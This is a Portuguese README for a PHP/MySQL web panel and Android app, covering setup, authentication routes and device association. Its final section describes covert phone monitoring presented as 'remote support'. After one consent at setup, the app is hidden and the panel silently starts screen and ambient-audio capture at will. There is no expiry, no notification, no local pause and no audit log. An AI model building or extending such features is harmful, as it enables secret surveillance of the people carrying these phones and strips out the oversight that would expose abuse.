# sistema_web (PHP + MySQL)

Estrutura unificada:
- `public/`: frontend estático + front controller (`index.php`).
- `app/`: backend PHP (config, bootstrap, schema MySQL).
- `storage/media/`: ficheiros de media enviados pelo app.

## Configuração
Defina variáveis de ambiente:
- `DB_HOST`, `DB_PORT`, `DB_NAME`, `DB_USER`, `DB_PASS`
- `JWT_SECRET`
- `ADMIN_REGISTRATION_SECRET` (opcional)
- `APP_BASE_URL` (opcional, usado no link de recuperação)
- SMTP para recuperação de senha:
  - `SMTP_HOST`, `SMTP_PORT`, `SMTP_USER`, `SMTP_PASS`, `SMTP_SECURE`
  - `MAIL_FROM`, `MAIL_FROM_NAME`

## Executar localmente
```bash
php -S 0.0.0.0:3000 -t public
```

## Dependência de email (PHPMailer)
```bash
composer require phpmailer/phpmailer
```

## Compatibilidade
- As rotas do app Android continuam em `/api/*` sem alteração de contrato principal.
- A estrutura antiga (`backend/` e `web-frontend/`) foi removida para evitar duplicação; agora toda a aplicação web roda a partir de `public/` com backend em `app/`.

## Rotas de autenticação adicionadas
- `POST /api/auth/forgot-password`
- `POST /api/auth/reset-password`
- Páginas web:
  - `/login.html`
  - `/register.html`
  - `/forgot-password.html`
  - `/reset-password.html`

## Robustez adicionada
- Endpoint de health check: `GET /api/health`.
- Validação de acesso por owner/admin para endpoints sensíveis de device, telemetry e media.
- Operação de processamento de pagamentos com transação no banco.

## Associação automática do dispositivo
- A app Android faz associação automática do `deviceId` ao utilizador no login via `POST /api/devices/auto-assign`.
- O painel web deixa de depender de reivindicação manual do aparelho.
- A app usa um identificador estável do Android para evitar que o mesmo aparelho seja adicionado várias vezes.

## Consentimento remoto persistente para suporte
- A app Android passa a recolher um consentimento único para `screen` e `ambient_audio` durante a configuração inicial.
- Depois desse consentimento, a app pode ser ocultada e o painel web passa a iniciar ou parar sessões remotamente enquanto o telemóvel estiver online.
- `POST /api/devices/:deviceId/support-consent` guarda o consentimento persistente do dispositivo e a respetiva versão de texto.
- `POST /api/support-sessions/request` só inicia sessões em dispositivos com consentimento registado, online e cria a sessão logo como ativa (`approved`), sem prazo automático de expiração.
- O controlo das sessões passa a ficar exclusivamente no painel web; a app apenas sincroniza silenciosamente o estado remoto, não mostra notificações persistentes de suporte, não pausa sessões localmente e já não há eventos de auditoria de sessões.
